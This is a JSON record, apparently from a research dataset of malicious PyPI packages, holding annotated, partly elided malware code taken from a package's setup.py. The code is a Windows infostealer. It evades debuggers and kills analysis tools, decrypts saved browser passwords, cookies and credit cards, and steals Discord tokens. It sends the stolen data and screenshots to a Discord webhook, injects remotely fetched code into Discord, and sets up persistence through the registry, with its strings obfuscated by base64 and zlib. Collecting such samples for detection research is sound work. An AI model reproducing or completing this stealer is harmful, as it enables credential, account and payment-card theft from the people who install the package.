[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/v4pe-5/v4pe-5/setup.py",
    "malicious_code": "import subprocess\nimport ctypes\nimport os\nimport shutil\nimport re\nimport psutil\nimport requests\nimport base64\nimport json\nfrom Crypto.Cipher import AES\nfrom discord import Embed, SyncWebhook, File\nfrom win32crypt import CryptUnprotectData\nimport uuid\nimport wmi\nfrom PIL import ImageGrab\nimport sqlite3\nfrom pathlib import Path\nfrom zipfile import ZipFile\n\n# --- Malicious Data Exfiltration, Credential/Token Stealing, Persistence, and Injection ---\n\n# 1. Anti-debugging, anti-analysis, and process killing\nclass AntiDebug:\n    def __init__(self):\n        if self.checks():\n            sys.exit(int())\n    def checks(self):\n        # ... (blacklists, process killing, network/system checks)\n        self.check_process()\n        if self.get_network():\n            debugging = True\n        if self.get_system():\n            debugging = True\n        return debugging\n    def check_process(self):\n        for proc in psutil.process_iter():\n            if any((procstr in proc.name().lower() for procstr in self.blacklistedProcesses)):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n    def get_network(self):\n        ip = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode()).text\n        mac = base64.b64decode(zlib.decompress(b'x...')).decode().join(re.findall(base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode() % uuid.getnode()))\n        if ip in self.blackListedIPS:\n            return True\n        if mac in self.blackListedMacs:\n            return True\n    def get_system(self):\n        try:\n            hwid = subprocess.check_output(base64.b64decode(zlib.decompress(b'x...')).decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode(base64.b64decode(zlib.decompress(b'x...')).decode()).split(base64.b64decode(zlib.decompress(b'x...')).decode())[int.from_bytes(map(lambda O, i: 997 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)].strip()\n        except:\n            hwid = base64.b64decode(zlib.decompress(b'x...')).decode()\n        username = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        hostname = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):\n            if hwid in i or username in i or hostname in i:\n                return True\n\n# 2. Chromium/Opera browser credential, cookie, history, download, and credit card theft\nclass Chromium:\n    def __init__(self):\n        # ... (find browser paths, enumerate profiles)\n        for _, path in self.browsers.items():\n            if not os.path.exists(path):\n                continue\n            self.master_key = self.get_master_key(base64.b64decode(zlib.decompress(b'x...')).decode().format(path))\n            if not self.master_key:\n                continue\n            for profile in self.profiles:\n                if not os.path.exists(path + base64.b64decode(zlib.decompress(b'x...')).decode() + profile):\n                    continue\n                operations = [self.get_login_data, self.get_cookies, self.get_web_history, self.get_downloads, self.get_credit_cards]\n                for operation in operations:\n                    try:\n                        operation(path, profile)\n                    except Exception:\n                        pass\n    def get_master_key(self, path):\n        if not os.path.exists(path):\n            return\n        if base64.b64decode(zlib.decompress(b'x...')).decode() not in open(path, base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()).read():\n            return\n        with open(path, base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[base64.b64decode(zlib.decompress(b'x...')).decode()][base64.b64decode(zlib.decompress(b'x...')).decode()])\n        master_key = master_key[int.from_bytes(map(lambda O, i: 471 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):]\n        master_key = CryptUnprotectData(master_key, None, None, None, int.from_bytes(map(lambda O, i: 371 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False))[int.from_bytes(map(lambda O, i: 852 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)]\n        return master_key\n    def decrypt_password(self, buff, master_key):\n        iv = buff[int.from_bytes(map(lambda O, i: 531 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):int.from_bytes(map(lambda O, i: 409 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)]\n        payload = buff[int.from_bytes(map(lambda O, i: 993 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-int.from_bytes(map(lambda O, i: 701 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)].decode()\n        return decrypted_pass\n    def get_login_data(self, path, profile):\n        # ... (copy, open, and extract credentials from browser database, decrypt, and append to global list)\n        pass\n    def get_cookies(self, path, profile):\n        # ... (copy, open, and extract cookies from browser database, decrypt, and append to global list)\n        pass\n    def get_web_history(self, path, profile):\n        # ... (copy, open, and extract web history from browser database, append to global list)\n        pass\n    def get_downloads(self, path, profile):\n        # ... (copy, open, and extract downloads from browser database, append to global list)\n        pass\n    def get_credit_cards(self, path, profile):\n        # ... (copy, open, and extract credit cards from browser database, decrypt, and append to global list)\n        pass\n\n# 3. Discord token extraction and exfiltration\nclass extract_tokens:\n    def __init__(self):\n        # ... (set up paths, regex, extract tokens)\n        self.extract()\n    def extract(self):\n        # ... (search for Discord tokens in various app data folders, decrypt, validate, and collect tokens)\n        pass\n    def validate_token(self, token):\n        r = requests.get(self.base_url, headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token})\n        if r.status_code == int.from_bytes(map(lambda O, i: 858 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):\n            return True\n        return False\n    def decrypt_val(self, buff, master_key):\n        # ... (decrypt Discord token using master key)\n        pass\n    def get_master_key(self, path):\n        # ... (extract and decrypt master key from Local State)\n        pass\n\nclass upload_tokens:\n    def __init__(self, webhook):\n        self.tokens = extract_tokens().tokens\n        self.webhook = SyncWebhook.from_url(webhook)\n    def upload(self):\n        if not self.tokens:\n            return\n        for token in self.tokens:\n            user = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode(), headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token}).json()\n            # ... (collect user info, badges, payment, guilds, friends, gift codes, etc.)\n            embed = Embed(title=base64.b64decode(zlib.decompress(b'x...')).decode().format(username, user_id), color=int.from_bytes(map(lambda O, i: 719 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False))\n            # ... (add fields, send to webhook)\n            self.webhook.send(embed=embed, username=base64.b64decode(zlib.decompress(b'x...')).decode(), avatar_url=base64.b64decode(zlib.decompress(b'x...')).decode())\n\n# 4. Injection into Discord installations (malicious code injection for persistence and further compromise)\nclass Injection:\n    def __init__(self, webhook):\n        self.appdata = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        self.discord_dirs = [self.appdata + base64.b64decode(zlib.decompress(b'x...')).decode(), ...]\n        self.code = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode()).text\n        for proc in psutil.process_iter():\n            if base64.b64decode(zlib.decompress(b'x...')).decode() in proc.name().lower():\n                proc.kill()\n        for dir in self.discord_dirs:\n            if not os.path.exists(dir):\n                continue\n            if self.get_core(dir) is not None:\n                with open(self.get_core(dir)[int.from_bytes(map(lambda O, i: 286 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)] + base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n                    f.write(self.code.replace(base64.b64decode(zlib.decompress(b'x...')).decode(), self.get_core(dir)[int.from_bytes(map(lambda O, i: 313 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)]).replace(base64.b64decode(zlib.decompress(b'x...')).decode(), webhook))\n                    self.start_discord(dir)\n    def get_core(self, dir):\n        # ... (locate Discord core files for injection)\n        pass\n    def start_discord(self, dir):\n        # ... (restart Discord to load injected code)\n        pass\n\n# 5. Persistence via startup folder and registry modification\nclass Startup:\n    def __init__(self):\n        self.working_dir = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode()) + base64.b64decode(zlib.decompress(b'x...')).decode()\n        if self.check_self():\n            return\n        self.mkdir()\n        self.write_stub()\n        self.regedit()\n    def check_self(self):\n        if os.path.realpath(sys.executable) == self.working_dir + base64.b64decode(zlib.decompress(b'x...')).decode():\n            return True\n        return False\n    def mkdir(self):\n        if not os.path.isdir(self.working_dir):\n            os.mkdir(self.working_dir)\n        else:\n            shutil.rmtree(self.working_dir)\n            os.mkdir(self.working_dir)\n    def write_stub(self):\n        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + base64.b64decode(zlib.decompress(b'x...')).decode())\n        with open(file=base64.b64decode(zlib.decompress(b'x...')).decode().format(self.working_dir), mode=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n            f.write(base64.b64decode(zlib.decompress(b'x...')).decode().format(self.working_dir))\n    def regedit(self):\n        subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)\n        subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)\n\n# 6. System information and screenshot exfiltration\nclass SystemInfo:\n    def __init__(self, webhook):\n        webhook = SyncWebhook.from_url(webhook)\n        embed = Embed(title=base64.b64decode(zlib.decompress(b'x...')).decode(), color=int.from_bytes(map(lambda O, i: 664 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False))\n        # ... (add fields for user, system, disk, network, wifi, etc.)\n        image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)\n        image.save(base64.b64decode(zlib.decompress(b'x...')).decode())\n        embed.set_image(url=base64.b64decode(zlib.decompress(b'x...')).decode())\n        try:\n            webhook.send(embed=embed, file=File(base64.b64decode(zlib.decompress(b'x...')).decode(), filename=base64.b64decode(zlib.decompress(b'x...')).decode()), username=base64.b64decode(zlib.decompress(b'x...')).decode(), avatar_url=base64.b64decode(zlib.decompress(b'x...')).decode())\n        except:\n            pass\n        if os.path.exists(base64.b64decode(zlib.decompress(b'x...')).decode()):\n            os.remove(base64.b64decode(zlib.decompress(b'x...')).decode())\n\n# 7. Main execution logic to run all malicious modules\n\ndef main():\n    funcs = [AntiDebug, Browsers, DiscordToken, Injection, Startup, SystemInfo]\n    for func in funcs:\n        if __CONFIG__[func.__name__.lower()]:\n            try:\n                if func.__init__.__code__.co_argcount == int.from_bytes(map(lambda O, i: 453 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):\n                    func(__CONFIG__[base64.b64decode(zlib.decompress(b'x...')).decode()])\n                else:\n                    func()\n            except Exception as e:\n                print(base64.b64decode(zlib.decompress(b'x...')).decode().format(func.__name__, e))\n\nif __name__ == base64.b64decode(zlib.decompress(b'x...')).decode():\n    main()\n"
  }
]